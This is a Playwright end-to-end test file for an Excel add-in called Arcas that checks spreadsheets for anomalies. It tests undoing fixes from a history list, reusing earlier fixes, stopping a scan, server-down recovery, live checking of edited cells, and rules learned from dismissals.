    await two.waitForFunction(() => !__state.working && document.getElementById("fix-pick-0").checkVisibility());
    const c3 = await card();
    ok(JSON.stringify(c3.cells) === "[10,7.99]" && JSON.stringify(c3.picks) === '["Make Qty 1","Make Total 79.9"]' && !c3.accept,
      "AH-238: Undo puts the row back and both choices return - " + JSON.stringify(c3));
    await two.click("#fix-pick-0");
    await two.waitForFunction(() => !__state.working && document.getElementById("fix-undo").checkVisibility());
    const c4 = await card();
    ok(JSON.stringify(c4.cells) === "[1,7.99]" && slipped.length === 0, "AH-238: Make Qty 1 writes only the Qty - " + JSON.stringify({ ...c4, slipped }));
    await two.close();
  }

  // AH-218 (John's master spec): "Changes Arcas made" lists every fix accepted in the workbook, newest first, each with
  // its own Undo, and outlives a reload: two fixes accepted, the pane reloaded, the older one undone from the list puts
  // its cell back and leaves the newer; a cell changed by hand since is left alone and said; with a scan showing, the
  // card's own Undo does the work
  {
    const his = await browser.newPage({ ignoreHTTPSErrors: true, viewport: { width: 360, height: 900 } });
    const slipped = [];
    his.on("pageerror", (e) => slipped.push(e.message));
    await his.route("https://appsforoffice.microsoft.com/**", (r) => r.fulfill({ contentType: "text/javascript", body: fs.readFileSync(DIR + "fake-office.js", "utf8") }));
    await his.goto("https://127.0.0.1:5055/taskpane.html");
    await his.waitForSelector("#main-ui", { state: "visible" });
    const ready = () => his.waitForFunction(() => !__state.working && !document.getElementById("scan").disabled);
    const accept = async (r) => {
      await his.click(`#flagged-list button:has-text("Row ${r} ")`);
      await his.waitForFunction(() => !__state.working && document.getElementById("fix-apply").checkVisibility() && !document.getElementById("fix-apply").disabled);
      await his.click("#fix-apply");
      await his.waitForFunction(() => !__state.working && document.getElementById("fix-undo").checkVisibility());
      await his.click("#fix-back"); await his.waitForSelector("#results", { state: "visible" });
    };
    await his.evaluate((rows) => __load("Sales", rows, [0]), rows);
    await his.click("#scan"); await ready();
    await accept(11); await accept(22);
    const fixed = await his.evaluate(() => [__cell("Sales", "C11").v, __cell("Sales", "C22").v]);
    await his.reload(); await his.waitForSelector("#main-ui", { state: "visible" });
    await his.click("#history-box summary");
    await his.waitForFunction(() => document.querySelectorAll("#history-list li").length === 2, null, { timeout: 3000 }).catch(() => {});
    const items = () => his.$$eval("#history-list li", (ls) => ls.map((l) => l.innerText.replace(/\s+/g, " ").trim()));
    const listed = await items();
    ok(listed.length === 2 && listed[0].startsWith(`Sales C22: 7777 → ${fixed[1]}`) && listed[1].startsWith(`Sales C11: -5 → ${fixed[0]}`) && fixed[0] !== -5,
      "AH-218: after a reload, Changes Arcas made lists both fixes, newest first, as the card shows a change - " + JSON.stringify({ listed, fixed }));
    const m = await his.evaluate(() => ({ h: [...document.querySelectorAll("#history-list button")].map((b) => b.getBoundingClientRect().height), list: document.getElementById("history-list").offsetHeight,
      next: Math.round(document.querySelector("#history-box + details").getBoundingClientRect().top + scrollY) }));
    await his.locator("#history-list li").nth(1).locator("button").click(); await ready();
    const after = await his.evaluate(() => ({ c11: __cell("Sales", "C11").v, c22: __cell("Sales", "C22").v, notice: document.getElementById("history-state").textContent,
      kept: (__settings.anomalyHunterAcceptUndo || []).map((u) => u.cells.map((c) => c[0]).join()).join("|"), list: document.getElementById("history-list").offsetHeight,
      done: [...document.querySelectorAll("#history-list button")].map((b) => `${b.textContent}:${b.disabled}`).join(), foot: document.getElementById("notice").textContent,
      next: Math.round(document.querySelector("#history-box + details").getBoundingClientRect().top + scrollY),
      fixed: Object.values(__settings.anomalyHunterDecisions?.Sales || {}).join() }));
    ok(after.c11 === -5 && after.c22 === fixed[1] && after.kept === "C22" && after.fixed === "fixed" && after.notice === "Undone. C11 on Sales is back to what it was."
      && after.done === "Undo:false,Undone:true" && after.list === m.list && after.next === m.next && !after.foot && m.h.every((h) => h >= 44),
      "AH-218: Undo of the older fix from the list puts its cell back, takes its Fixed and its record out, leaves the newer, and nothing moves - " + JSON.stringify({ after, m }));
    await his.evaluate(() => __edit("Sales", "C22", 12)); // changed by hand since the fix: the user's now
    await his.locator("#history-list li").nth(0).locator("button").click(); await ready();
    const refused = await his.evaluate(() => [__cell("Sales", "C22").v, document.getElementById("history-state").textContent, (__settings.anomalyHunterAcceptUndo || []).length]);
    ok(JSON.stringify(refused) === '[12,"C22 changed after the fix, so Undo left it alone.",1]', "AH-218: a fixed cell changed by hand since is left alone, and said - " + JSON.stringify(refused));
    await his.evaluate((v) => __edit("Sales", "C22", v), fixed[1]);
    await his.click("#scan"); await ready(); // a scan finds the fixed row again: the card's own Undo puts it back
    await his.click("#history-box summary"); await his.click("#history-box summary"); // closed, then opened again
    await his.waitForFunction(() => document.querySelectorAll("#history-list li").length === 1);
    await his.locator("#history-list li button").click(); await ready();
    const viaCard = await his.evaluate(() => ({ c22: __cell("Sales", "C22").v, notice: document.getElementById("history-state").textContent, kept: (__settings.anomalyHunterAcceptUndo || []).length,
      tag: [...document.querySelectorAll("#flagged-list button")].find((b) => /^Row 22\b/.test(b.innerText))?.querySelector(".sev")?.textContent }));
    ok(viaCard.c22 === 7777 && viaCard.notice === "Undone. C22 on Sales is back to what it was." && viaCard.kept === 0 && viaCard.tag !== "Fixed" && slipped.length === 0,
      "AH-218: with a scan showing, the list's Undo goes through the card's Undo: the cell, the record and the row's tag - " + JSON.stringify({ viaCard, slipped }));
    await his.click("#history-box summary"); await his.click("#history-box summary"); // closed, then opened again
    await his.waitForFunction(() => !document.querySelectorAll("#history-list li").length, null, { timeout: 3000 }).catch(() => {});
    ok((await items()).length === 0 && await his.isVisible("#history-empty"), "AH-218: opened again, the list says it holds nothing");
    await his.close();
  }

  // AH-219 (John, 2026-11-25: "promote repeated manual fixes"): a fix accepted once is offered first on the card of a
  // later identical slip (same column, kind and old value), with a line that says so, and written only by Accept; once
  // both are undone, a fresh scan's card no longer offers it. A page of its own: its own browser storage, empty
  {
    const mem = await browser.newPage({ ignoreHTTPSErrors: true, viewport: { width: 360, height: 900 } });
    const slipped = [], posts = [];
    mem.on("pageerror", (e) => slipped.push(e.message));
    mem.on("request", (r) => r.method() === "POST" && posts.push(new URL(r.url()).pathname));
    await mem.addInitScript(() => { localStorage.setItem("anomalyHunterLive", "0"); window.__shift = 0;
      new PerformanceObserver((l) => { for (const e of l.getEntries()) if (!e.hadRecentInput) window.__shift += e.value; }).observe({ type: "layout-shift", buffered: true }); });
    await mem.route("https://appsforoffice.microsoft.com/**", (r) => r.fulfill({ contentType: "text/javascript", body: fs.readFileSync(DIR + "fake-office.js", "utf8") }));
    await mem.goto("https://127.0.0.1:5055/taskpane.html");
    await mem.waitForSelector("#main-ui", { state: "visible" });
    const ready = () => mem.waitForFunction(() => !__state.working && !document.getElementById("scan").disabled);
    const twice = rows.map((r) => [...r]);
    // row 40: the same slip as row 22, its Total left blank, so its own numbers prove no value; row 60: the same slip,
    // whose own numbers say another value than row 22's
    twice[39][2] = 7777; twice[39][4] = ""; twice[59][2] = 7777;
    await mem.evaluate((rows) => __load("Sales", rows, [0]), twice);
    await mem.click("#scan"); await ready();
    // the card as it lands, every layout shift from the press until it has, as CLS counts them, and where the
    // Accept/Dismiss row sits in the page's layout (the turn's transform left out) as the card starts to open (its still
    // bars hold the fix area) and once its fix has landed (fix round 1: the line beside the engine's advice dropped it 12 px here)
    const open = async (r) => {
      await mem.evaluate(() => { window.__shift = 0; window.__ys = [];
        const y = (e) => { let t = 0; for (; e; e = e.offsetParent) t += e.offsetTop; return t; }, v = document.getElementById("fix-view");
        window.__yo?.disconnect();
        (window.__yo = new MutationObserver(() => __ys.push(y(document.querySelector(".fix-result .row-buttons"))))).observe(v, { attributes: true, attributeFilter: ["data-opening"] }); });
      await mem.click(`#flagged-list button:has-text("Row ${r} ")`);
      await mem.waitForFunction(() => !__state.working && !document.getElementById("fix-view").hasAttribute("data-opening") && document.getElementById("fix-explanation").textContent);
      await mem.waitForFunction(() => document.getAnimations().every((a) => a.playState !== "running"), null, { timeout: 5000 }).catch(() => {});
      return mem.evaluate(() => ({ label: document.getElementById("fix-label").textContent, why: document.getElementById("fix-explanation").textContent,
        first: document.querySelector("#fix-changes li")?.innerText.replace(/\s+/g, " ").trim(), shift: window.__shift, accept: document.getElementById("fix-apply").checkVisibility(), ys: window.__ys }));
    };
    const press = async (id, until) => { await mem.click(id); await mem.waitForFunction((u) => !__state.working && document.getElementById(u).checkVisibility(), until); };
    const back = async () => { await mem.click("#fix-back"); await mem.waitForSelector("#results", { state: "visible" }); };
    const first = await open(22);
    await press("#fix-apply", "fix-undo");
    const fixed = await mem.evaluate(() => __cell("Sales", "C22").v);
    await back();
    const other = await open(60);
    ok(other.label === "Suggested fix" && !other.why.includes("You fixed this") && other.first !== `C60: 7777 → ${fixed}`,
      "AH-219: where the row's own numbers say another value, the engine's fix stays and the past one is not shown - " + JSON.stringify(other));
    await back();
    const k = posts.length;
    const again = await open(40);
    ok(fixed !== 7777 && again.label === "Your earlier fix: check it before you accept" && again.first === `C40: 7777 → ${fixed}`
      && again.why === `You fixed this the same way before: Units 7777 became ${fixed}.` && again.accept && !posts.slice(k).includes("/suggest"),
      "AH-219: a later identical slip's card offers the fix accepted before, first, and says so - " + JSON.stringify({ first, again, fixed, posts: posts.slice(k) }));
    ok(again.shift === 0 && first.shift === 0 && again.ys.length === 2 && again.ys[0] === again.ys[1],
      "AH-219: nothing moves while the card opens with the line: Accept and Dismiss stay where the held fix area put them - " + JSON.stringify([first.shift, again.shift, again.ys]));
    const before = await mem.evaluate(() => __cell("Sales", "C40").v);
    await press("#fix-apply", "fix-undo");
    ok(before === 7777 && (await mem.evaluate(() => __cell("Sales", "C40").v)) === fixed, "AH-219: written only when Accept is pressed - " + JSON.stringify(before));
    await press("#fix-undo", "fix-apply"); await back(); // both fixes undone: what the AI learned of them goes too
    await open(22); await press("#fix-undo", "fix-apply"); await back();
    await mem.click("#scan"); await ready();
    const gone = await open(40), kept = await mem.evaluate(() => JSON.parse(localStorage.getItem("anomalyHunterAiMemory") || "[]").length);
    ok(!gone.why.includes("You fixed this the same way before") && gone.label !== "Your earlier fix: check it before you accept" && kept === 0 && slipped.length === 0,
      "AH-219: once undone, a fresh scan's card no longer offers it - " + JSON.stringify({ gone, kept, slipped }));
    await mem.close();
  }
}

// AH-228 B: the footer's version, the tab in front, Stop, and Arcas stopped mid-scan
if (mode === "flow2") {
  await page.evaluate(() => __activate("Sales")); await find();
  // P-31: the footer says the version in plain words ("Engine dev 843936a (2026-11-25)" was a developer's line)
  ok(/^(Test version|Version \d[\d.]*)( \(\d{1,2} [A-Z][a-z]{2} \d{4}\))?$/.test(await text("#engine-version")), "AH-228 P-31: the footer's version in plain words - " + (await text("#engine-version")));
  // P-15: the header names the tab in front as it changes, and a list made on another tab says so
  await page.evaluate(() => { __load("Budget", [["Item", "Cost"], ["Pen", 2], ["Ink", 3]]); __activate("Budget"); });
  await page.waitForFunction(() => document.getElementById("sheet-name").textContent === "Budget", null, { timeout: 3000 }).catch(() => {});
  const away = { name: await text("#sheet-name"), notice: await text("#notice") };
  await page.evaluate(() => __activate("Sales"));
  await page.waitForFunction(() => document.getElementById("sheet-name").textContent === "Sales", null, { timeout: 3000 }).catch(() => {});
  const home = { name: await text("#sheet-name"), notice: await text("#notice") };
  ok(away.name === "Budget" && away.notice === "This list is for Sales. Find problems checks Budget." && home.name === "Sales" && home.notice === "",
    "AH-228 P-15: the header follows the tab in front, and says when the list is another tab's - " + JSON.stringify({ away, home }));
  // P-28: Stop on the progress line ends a slow scan: the list stays as it was, and it says nothing was changed
  const listed = await text("#flagged-list"), cells = await page.evaluate(() => JSON.stringify(["C11", "C22"].map((a) => __cell("Sales", a))));
  await failing(/ERR_ABORTED|aborted/i, async () => {
    await page.route("**/scan", async (r) => { await new Promise((go) => setTimeout(go, 3000)); await r.continue().catch(() => {}); }, { times: 1 });
    await page.click("#scan");
    await page.waitForSelector("#stop-scan", { state: "visible", timeout: 5000 }).catch(() => {});
    const tall = await page.evaluate(() => document.getElementById("stop-scan").getBoundingClientRect().height);
    await page.click("#stop-scan"); await idle();
    ok(tall >= 44 && (await text("#notice")) === "Stopped. Nothing was changed." && (await text("#flagged-list")) === listed && (await page.isVisible("#results"))
      && !(await page.isVisible("#stop-scan")) && cells === await page.evaluate(() => JSON.stringify(["C11", "C22"].map((a) => __cell("Sales", a)))),
      "AH-228 P-28: Stop ends the scan, the list stays as it was, nothing written - " + JSON.stringify({ tall, notice: await text("#notice") }));
    await page.waitForTimeout(3200); // the held answer arrives and is dropped
  });
  // P-24: Arcas gone in the middle of a scan is said the one way, #server-down, which tries again by itself
  await failing(DROPPED, async () => {
    const refuse = (r) => r.abort("connectionrefused");
    await page.route("**/health", refuse); await page.route("**/scan", dropMidway, { times: 1 });
    await page.click("#scan");
    await page.waitForSelector("#server-down", { state: "visible", timeout: 12000 }).catch(() => {});
    const down = { shown: await page.isVisible("#server-down"), main: await page.isVisible("#main-ui"), retrying: await page.isVisible("#retrying") };
    ok(down.shown && !down.main && down.retrying && (await text("#server-down")).includes("Arcas is trying again by itself."),
      "AH-228 P-24: Arcas stopped mid-scan shows Arcas has stopped, trying again by itself - " + JSON.stringify(down));
    await page.unroute("**/health", refuse);
    await page.waitForSelector("#main-ui", { state: "visible", timeout: 9000 }).catch(() => {});
  });
  ok(await page.isVisible("#main-ui") && (await text("#notice")) === "", "AH-228 P-24: back by itself, with no stale words - " + (await text("#notice")));
}

if (mode === "live") { // AH-180, AH-181
  // three tabs of one experiment, each a time axis and a series; the third holds its own series until the paste below
  const wave = (k) => Array.from({ length: 40 }, (_, i) => Math.round(100 * Math.sin(i * 1.3 + k)) / 10 + 50);
  const series = (k, head) => [["Time (s)", head], ...wave(k).map((v, i) => [i, v])];
  await page.evaluate(([a, b, c]) => { __load("Series 1", a); __load("Series 2", b); __load("Series 3", c); __activate("Series 1"); },
    [series(1, "Signal"), series(2, "Signal"), series(3, "Response")]);
  const note = () => page.evaluate(() => { const n = document.getElementById("live-note"); return n.checkVisibility() ? n.textContent.replace(/\s+/g, " ").trim() : ""; });
  const chimes = () => page.evaluate(() => window.__tones / 2); // two notes a chime
  const waitNote = async (has) => { const t0 = Date.now();
    await page.waitForFunction((has) => document.getElementById("live-note").checkVisibility() && document.getElementById("live-note").textContent.includes(has), has, { timeout: 8000 }).catch(() => {});
    return Date.now() - t0; };
  await page.click("#live-box summary"); // a press in the pane: the browser lets it make sound from now on
  ok(await page.isChecked("#live") && await page.isChecked("#live-sound"), "AH-181: Check the cells I change and Play a sound are on unless turned off");
  await page.waitForFunction(() => [...document.querySelectorAll("[data-enter]")].every((e) => !e.style.opacity && !e.style.transform), null, { timeout: 5000 });
  const scanAt = await page.evaluate(() => document.getElementById("scan").getBoundingClientRect().top);
  // a wild value typed into a tab that is not the one shown
  await page.evaluate(() => __edit("Sales", "C30", 77777));
  const ms = await waitNote("You changed C30 on Sales.");
  const said = await note();
  // AH-228 P-13 (was 'Sheet "Sales", cell C30: Very likely wrong.'): the cell changed, then the one that looks wrong
  ok(said.startsWith("You changed C30 on Sales. It looks wrong: Units is 77777") && ms < 3500, `AH-181: a wild value typed on a tab not shown is said with its cell in ${ms} ms - ${said}`);
  ok(await chimes() === 1, `AH-181: and one chime - ${await chimes()}`);
  ok((await text("#live-more")) === "Check the whole sheet", "AH-228 P-14: with no list of this sheet, the note offers to check the whole sheet - " + (await text("#live-more")));
  { const m = await page.evaluate(() => ({ scan: document.getElementById("scan").getBoundingClientRect().top, crest: document.querySelector("#live-note img").alt,
      buttons: [...document.querySelectorAll("#live-note button")].map((b) => b.getBoundingClientRect().height), pos: getComputedStyle(document.getElementById("live-note")).position }));
    ok(m.scan === scanAt && m.pos === "fixed" && m.crest === "" && m.buttons.every((h) => h >= 44), "AH-181: the note lies over the pane's foot, with the crest, moving nothing, its buttons 44 px tall - " + JSON.stringify({ ...m, scanAt })); }
  await contrast("the note of a check as you work");
  await page.click("#live-show");
  await page.waitForFunction(() => window.__selection === "Sales!C30", null, { timeout: 3000 }).catch(() => {});
  ok(await page.evaluate(async () => [window.__selection, await Excel.run(async (ctx) => ctx.workbook.worksheets.getActiveWorksheet().name)].join()) === "Sales!C30,Sales",
    "AH-181: Show me brings that tab in front and selects the cell");
  await page.click("#live-close");
  ok(!(await note()), "AH-181: Close takes the note away");
  // the same cell retyped and still wrong is said again: every change gets an answer (John, 2026-11-17)
  await page.evaluate(() => __edit("Sales", "C30", 66666));
  await waitNote("Units is 66666");
  ok((await note()).startsWith("You changed C30 on Sales.") && await chimes() === 2, "AH-181: a flagged cell retyped and still wrong is said again, with a chime - " + (await note()));
  await page.click("#live-close");
  // an ordinary value: said quietly in the notice that the cell was checked, with no note and no chime
  await page.evaluate(() => __edit("Sales", "B45", "Central"));
  const t45 = Date.now();
  await page.waitForFunction(() => document.getElementById("notice").textContent === 'Checked B45 on "Sales": nothing unusual.', null, { timeout: 8000 }).catch(() => {});
  const quiet = { ms: Date.now() - t45, said: await text("#notice"), note: await note(), chimes: await chimes() };
  ok(quiet.said === 'Checked B45 on "Sales": nothing unusual.' && quiet.ms < 3500 && !quiet.note && quiet.chimes === 2,
    "AH-181: an ordinary value typed is said checked in the notice, with no note and no chime - " + JSON.stringify(quiet));
  // the pane's own writes are never checked: Accept writes a cell and no note comes
  await find();
  await openRow(11);
  await page.click("#fix-apply"); await idle();
  await page.waitForTimeout(3000);
  ok((await text("#fix-status")).startsWith("Accepted") && !(await note()) && await chimes() === 2, "AH-181: Accept writes its fix and raises no note - " + (await note()));
  await back();
  // turned off: an edit is not checked
  await page.click("#live");
  await page.evaluate(() => __edit("Sales", "C40", 88888));
  await page.waitForTimeout(3000);
  ok(!(await note()) && await page.evaluate(() => localStorage.getItem("anomalyHunterLive")) === "0", "AH-181: with Check the cells I change off, an edit raises no note");
  const soundOff = await page.isDisabled("#live-sound");
  await page.click("#live");
  ok(soundOff && !(await page.isDisabled("#live-sound")) && await page.isChecked("#live-sound"), "AH-228 P-29: Play a sound is off while Check the cells I change is, and back with it");
  // AH-180: series 2's numbers pasted on tab 3, under its own header
  await page.evaluate((col) => __paste("Series 3", "B2", col.map((v) => [v])), wave(2));
  const pms = await waitNote('"Series 3" holds the same 40 numbers as "Series 2"');
  ok((await note()).includes('"Series 3" holds the same 40 numbers as "Series 2", in the same order.') && await chimes() === 3, `AH-180: pasting series 2's numbers on tab 3 is said at once (${pms} ms), with a chime - ${await note()}`);
  // AH-207: one strength for both (John, 2026-11-19: "at maximum strength ... the automatic scanning while the user is
  // working is at full strength"): the slider's level goes with Check as you work's /scan too, and the fold says so
  await page.click("#live-close");
  const liveAt = async (key, level, cell) => {
    await page.$eval("#strength-box", (d) => (d.open = true)); await page.focus("#strength"); await page.keyboard.press(key);
    await page.waitForFunction((l) => __state.lastStrength === l && !document.getElementById("scan").disabled, level, { timeout: 15000 }).catch(() => {});
    await page.waitForTimeout(800); await idle(); // the slider's own re-check of the sheet shown, done before the edit
    const s = scans.length;
    await page.evaluate((c) => __edit("Series 1", c, 50), cell);
    await page.waitForFunction((c) => document.getElementById("notice").textContent.startsWith(`Checked ${c} on "Series 1"`) || document.getElementById("live-note").checkVisibility(), cell, { timeout: 8000 }).catch(() => {});
    if (await note()) await page.click("#live-close");
    return scans.slice(s).map((b) => `${b.sheet}:${b.strength}`).join();
  };
  { const at10 = await liveAt("End", 10, "B5");
    ok(at10 === "Series 1:10", "AH-207: with the slider at 10, Check as you work's /scan is sent at 10 - " + at10);
    const at0 = await liveAt("Home", 0, "B6");
    ok(at0 === "Series 1:0", "AH-207: with the slider at 0, Check as you work's /scan is sent at 0 - " + at0);
    const said = await page.evaluate(() => [document.getElementById("strength-both")?.textContent, document.getElementById("live-hint").textContent]);
    ok(said[0] === "Find problems and Check as you work both use this level." && said[1].endsWith(" It uses the level you set under Find problems."),
      "AH-207: the slider's fold and Check as you work's fold say the one level is used by both - " + JSON.stringify(said)); }
  // AH-205 (John, 2026-11-19: "learn really fast so the tool can fully help the user in one session"): a Dismiss teaches
  // the sheet at once, and "Stop checking ..." mutes one kind of check in one column; both kept in the workbook as codes
  // and [kind, column], never a value, sent with the next scan, and gone with Forget. "Cnetral" typed on rows 32 and 62,
  // a second blank Units on row 151 beside row 121's. Here in mode live, which has the time flow mode no longer has
  { const bar = rows.map((r) => [...r]);
    bar[31][1] = bar[61][1] = "Cnetral"; bar[150][2] = "";
    await page.evaluate((bar) => __load("Bar", bar, [0]), bar);
    await find();
    const tagOn = (r) => page.locator(`#flagged-list button:has-text("Row ${r} ") .sev`).textContent({ timeout: 2000 }).catch(() => null);
    ok((await tagOn(32)) && (await tagOn(62)) && (await tagOn(121)) && (await tagOn(151)), "AH-205: both Cnetral rows and both blank Units are flagged first");
    await openRow(32);
    // measured once the card has turned in: since AH-228 the line is named when the card's fix is known, while it still turns
    await page.waitForFunction(() => document.getAnimations().every((a) => a.playState !== "running"), null, { timeout: 5000 }).catch(() => {});
    const mute = await page.evaluate(() => { const b = document.getElementById("fix-mute"); return { said: b.textContent, shown: b.checkVisibility({ visibilityProperty: true }), h: b.getBoundingClientRect().height }; });
    ok(mute.said === "Never check spelling in Region on this sheet" && mute.shown && mute.h >= 44, "AH-205: the card offers to stop the row's check in its column, 44 px tall - " + JSON.stringify(mute));
    await contrast("a card with Stop checking");
    // the line is held: an Accept hides it and nothing under it moves (row 11's -5, then Undo)
    await back(); await openRow(11);
    const at = () => page.evaluate(() => { const b = document.getElementById("fix-mute"); return [b.offsetHeight, b.checkVisibility({ visibilityProperty: true })]; });
    const before = await at();
    await page.click("#fix-apply"); await idle();
    const after = await at();
    ok(before[1] && !after[1] && before[0] === after[0], "AH-205: after Accept the Stop checking line is hidden and keeps its height, so nothing under it moves - " + JSON.stringify({ before, after }));
    await page.click("#fix-undo"); await idle(); await back();
    await openRow(32);
    await page.click("#fix-dismiss"); await idle();
    const book = await page.evaluate(() => JSON.stringify(__settings.anomalyHunterAccepted || null));
    ok(/"Bar":\[\["Region","[0-9a-z]{1,11}"\]\]/.test(book) && !book.includes("Cnetral"), "AH-205: Dismiss keeps a code of the value it accepted, in its column, never the value - " + book);
    if (await page.isVisible("#fix-back")) await back();
    const s0 = scans.length;
    await find();
    ok(JSON.stringify(scans.slice(s0)[0]?.learned) === JSON.stringify({ accept: [["Region", "Cnetral"]], ignore: [] }),
      "AH-205: the next Find problems sends what the sheet learned - " + JSON.stringify(scans.slice(s0)[0]?.learned));
    ok((await tagOn(62)) === null && (await tagOn(32)) === "Dismissed" && (await tagOn(11)) && (await tagOn(121)),
      `AH-205: the next Find problems no longer flags row 62's Cnetral; row 32 stays Dismissed and the rest are still there - ${await tagOn(62)}, ${await tagOn(32)}, ${await tagOn(11)}, ${await tagOn(121)}`);
    await openRow(121);
    ok((await text("#fix-mute")) === "Never check blanks in Units on this sheet", "AH-205: a blank's card offers to stop checking blanks in its column - " + (await text("#fix-mute")));
    await page.click("#fix-mute"); await idle();
    ok((await text("#notice")).startsWith("Arcas will not check blanks in Units on this sheet again."), "AH-205: the foot bar says what was learned - " + (await text("#notice")));
    ok((await page.evaluate(() => JSON.stringify(__settings.anomalyHunterIgnored))) === '{"Bar":[["blank","Units"]]}', "AH-205: the stopped check is kept as its kind and column");
    if (await page.isVisible("#fix-back")) await back();
    await find();
    ok((await tagOn(151)) === null && (await tagOn(121)) === "Dismissed" && (await tagOn(11)) && (await tagOn(22)),
      `AH-205: the next scan no longer flags row 151's blank Units, and another kind in Units (rows 11 and 22) still shows - ${await tagOn(151)}, ${await tagOn(11)}`);
    { const m = await matchesEngine(); ok(m.ok, "AH-205: the list still shows exactly what the engine answered - " + m.why); }
    await page.locator("details.more:has(#forget-book)").evaluate((d) => (d.open = true));
    await page.click("#forget-book"); await idle();
    ok((await text("#forget-state")).includes("the codes of the values you dismissed; the checks you stopped"), "AH-205: Forget names both - " + (await text("#forget-state")));
    await find();
    ok((await tagOn(62)) && (await tagOn(151)) && !scans.at(-1).learned, "AH-205: after Forget the next scan learns nothing and flags rows 62 and 151 again"); }
  // AH-205: Check as you work uses what a Dismiss taught: "Cnetral" typed is flagged, dismissed, then typed again on
  // another row and only said checked
  { await page.evaluate(() => __activate("Sales"));
    await page.evaluate(() => __edit("Sales", "B50", "Cnetral"));
    await waitNote("You changed B50");
    ok((await note()).startsWith("You changed B50 on Sales."), "AH-205: Cnetral typed is said as you work - " + (await note()));
    await page.click("#live-close");
    await find(); await openRow(50);
    await page.click("#fix-dismiss"); await idle();
    if (await page.isVisible("#fix-back")) await back();
    const s0 = scans.length;
    await page.evaluate(() => __edit("Sales", "B60", "Cnetral"));
    await page.waitForFunction(() => document.getElementById("notice").textContent.startsWith('Checked B60 on "Sales"') || document.getElementById("live-note").checkVisibility(), null, { timeout: 8000 }).catch(() => {});
    ok((await text("#notice")) === 'Checked B60 on "Sales": nothing unusual.' && !(await note()) && JSON.stringify(scans.slice(s0)[0]?.learned?.accept) === '[["Region","Cnetral"]]',
      "AH-205: a value dismissed once, typed on another row, is not called wrong as you work - " + JSON.stringify({ notice: await text("#notice"), note: await note(), learned: scans.slice(s0)[0]?.learned })); }
  // AH-218 (John's master spec: no nagging on the row being typed): a blank left on the row the selected cell is still on
  // waits, and is said the moment the selection leaves the row; a spelling slip on that row is said at once
  { const scanned = async (k) => { for (let t = 0; t < 100 && replies.length === k; t++) await page.waitForTimeout(100); await page.waitForTimeout(300); };
    const units = await page.evaluate(() => { __activate("Sales"); __userSelect("Sales", "D12"); return __cell("Sales", "C12").v; });
    let k = replies.length;
    await page.evaluate(() => __edit("Sales", "C12", ""));
    await scanned(k);
    const typing = { note: await note(), notice: await text("#notice"), chimes: await chimes() };
    ok(replies.length > k && !typing.note && !typing.notice.startsWith("Checked C12"), "AH-218: a blank left on the row still being typed is not said yet - " + JSON.stringify(typing));
    const t0 = Date.now();
    await page.evaluate(() => __userSelect("Sales", "C13"));
    await waitNote("You changed C12");
    ok((await note()).startsWith("You changed C12 on Sales.") && Date.now() - t0 < 1000 && await chimes() === typing.chimes + 1,
      `AH-218: it is said the moment the selection leaves the row (${Date.now() - t0} ms), with its chime - ` + (await note()));
    await page.click("#live-close");
    k = replies.length;
    await page.evaluate((v) => __edit("Sales", "C12", v), units);
    await scanned(k);
    await page.evaluate(() => __userSelect("Sales", "C14"));
    const t1 = Date.now();
    await page.evaluate(() => __edit("Sales", "B14", "Cental"));
    const ms = await waitNote("You changed B14");
    ok((await note()).startsWith("You changed B14 on Sales.") && ms < 3500, `AH-218: a spelling slip on the row the selection is on is said at once (${Date.now() - t1} ms) - ` + (await note()));
    await page.click("#live-close"); }
  // AH-228 P-14: past Show me, the note's next step: Check the whole sheet runs Find problems, and once the list holds the
  // row, Open its card opens that row's card as the list does
  { await page.evaluate(() => { __activate("Sales"); __edit("Sales", "C33", 77770); });
    await waitNote("You changed C33 on Sales.");
    const first = await text("#live-more"), k = scans.length;
    await page.click("#live-more"); await idle();
    await page.waitForSelector("#results", { state: "visible", timeout: 5000 }).catch(() => {});
    const scanned = scans.length > k && !!(await page.$('#flagged-list button:has-text("Row 33 ")'));
    // Find problems selected row 33's cell: an edit there that breaks only its row's sum waits till the row is left (AH-218)
    await page.evaluate(() => { __userSelect("Sales", "A2"); __edit("Sales", "C33", 77771); });
    await waitNote("You changed C33 on Sales.");
    const then = await text("#live-more");
    await page.click("#live-more");
    await page.waitForFunction(() => /^Row 33\b/.test(document.getElementById("fix-title").textContent) && !document.getElementById("fix-view").hidden, null, { timeout: 5000 }).catch(() => {});
    ok(first === "Check the whole sheet" && scanned && then === "Open its card" && /^Row 33\b/.test(await text("#fix-title")) && !(await note()),
      "AH-228 P-14: Check the whole sheet runs Find problems, then Open its card opens the row's card - " + JSON.stringify({ first, scanned, then, title: await text("#fix-title") }));
    await back(); }
}

// AH-217 (John, 2026-11-21: "AI proposes, the no-AI engine verifies, then enforces locally for free"), pass 1 and pass 2:
// Check subject rules once (the stub names Paid at most Amount and Amount = Qty x Price x FX rate, which no check of the
// scan's own finds), Stop checking on an honest exception to one, fix the other by hand; then the AI fails, the pane is
// reloaded, and a new row against each rule is typed: Check as you work and Find problems flag the one against the kept
// rule with no /rules call and no AI, and stay quiet on the stopped one. Here in mode live, which has Check as you work
if (mode === "live") {
  const ledger = [["Invoice", "Qty", "Price", "FX rate", "Amount", "Paid"]];
  for (let i = 0; i < 40; i++) { const q = 1 + ((i * 3) % 9), pr = 10.5 + ((i * 7) % 13), fx = +(0.9 + (i % 5) * 0.01).toFixed(2), a = +(q * pr * fx).toFixed(2);
    ledger.push([`INV-${1001 + i}`, q, pr, fx, a, +(a * (0.5 + (i % 4) * 0.1)).toFixed(2)]); }
  ledger[10][4] = +(ledger[10][4] + 25).toFixed(2); // row 11: an honest fixed fee on top, an exception to the product
  ledger[20][5] = +(ledger[20][4] + 10).toFixed(2); // row 21: paid more than billed, a slip
  await page.evaluate((g) => { __load("Ledger", g); __activate("Ledger"); }, ledger);
  const note = () => page.evaluate(() => { const n = document.getElementById("live-note"); return n.checkVisibility() ? n.textContent.replace(/\s+/g, " ").trim() : ""; });
  const tagOn = (r) => page.locator(`#flagged-list button:has-text("Row ${r} ") .sev`).textContent({ timeout: 2000 }).catch(() => null);
  const why = (r) => page.locator(`#flagged-list button:has-text("Row ${r} ") .row-why`).textContent({ timeout: 2000 }).catch(() => "");
  const RULE = "a rule the AI read from your headers";
  const KEPT = [{ kind: "order", first: "Paid", then: "Amount" }, { kind: "product", target: "Amount", factors: ["Qty", "Price", "FX rate"] }];
  await find();
  ok((await tagOn(11)) === null && (await tagOn(21)) === null, "AH-217: before Check subject rules, the scan's own checks flag neither row 11 nor row 21");
  const k0 = calls.length;
  await page.$eval("#ai-checks", (d) => (d.open = true)); // AH-228 P-18: under More checks with AI
